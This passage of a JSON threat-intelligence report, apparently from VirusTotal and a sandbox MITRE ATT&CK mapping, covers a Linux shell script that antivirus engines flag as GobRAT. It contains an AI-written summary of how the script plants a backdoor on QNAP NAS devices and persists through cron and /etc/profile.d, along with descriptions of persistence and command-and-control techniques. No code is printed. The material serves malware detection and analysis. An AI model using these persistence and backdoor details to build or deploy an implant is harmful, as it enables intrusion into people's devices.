          "engine_name": "TACHYON",
          "engine_version": "2023-07-04.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Linux/GobRAT-A",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4907",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.0NA103FM23",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.446",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230412"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.Linux.Generic.298138",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Linux.Generic.298138 (B)",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36151B:27.32290",
          "result": "Trojan.Linux.Generic.298138",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Shell.Agent",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.126.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "35797",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Linux.Generic.D48C9A",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230629"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Shell.Agent.bv",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230704-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23050.3",
          "result": "Trojan:Linux/ShellAgnt!MTB",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1688490048",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.23.3.10396",
          "result": "Downloader/Shell.Agent.SC189011",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.114",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230219"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=80)",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230702"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230628"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "result": "BASH/GobRAT.6049!tr",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "22.11.7701.0",
          "result": "BV:GobRat-A [Drp]",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        }
      },
      "reputation": -56,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 1,
        "critical": 0,
        "low": 1
      },
      "crowdsourced_ai_results": [
        {
          "category": "code_insight",
          "source": "palm",
          "id": "60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3-file-palm",
          "analysis": "This script is designed to download and install a backdoor on a QNAP NAS device. The backdoor is a binary executable file named \"apached\". The script first checks if the file already exists, and if not, it downloads it from a remote server. The file is then moved to a directory named \"/share/CACHEDEV3_DATA/.qnapd\" and given the executable permissions.\n\nThe script then sets up a cron job to run the \"start_script\" script every minute. This script simply runs the \"apached\" binary. The \"start_script\" script is also added to the \"/etc/profile.d/sshdaemon.sh\" file, which is executed when a user logs in to the NAS device. This ensures that the backdoor is always running.\n\nThe backdoor is a simple TCP server that listens on port 8080. When a connection is received, the backdoor sends back a list of commands that the attacker can execute. These commands include uploading and downloading files, running commands, and creating new users.\n\nThe backdoor also includes a feature that allows the attacker to upload a public SSH key to the NAS device. This allows the attacker to log in to the NAS device without a password.\n\nThis backdoor is a serious threat to the security of QNAP NAS devices. It allows an attacker to gain full control of the device and steal sensitive data.\n\nRECOMMENDATION:\n\nIf you are using a QNAP NAS device, I recommend that you immediately update your firmware to the latest version. You should also disable any remote access features that you are not using. If you are concerned about the security of your device, you can also install a security solution that can protect it from attacks."
        }
      ]
    },
    "type": "file",
    "id": "60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Zenbox Linux": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"awk\" command used to scan for patterns (typically in standard output)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"uname\" command used to read OS and architecture name"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads system information from the proc file system"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads CPU information from /sys indicative of miner or evasive malware"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample reads /proc/mounts (often used for finding a writable filesystem)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"ps\" command used to list the status of processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses the \"uname\" system call to query kernel version information (possible evasion)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"iptables\" command used for managing IP filtering and manipulation"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"wget\" command typically used for HTTP/S downloading"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
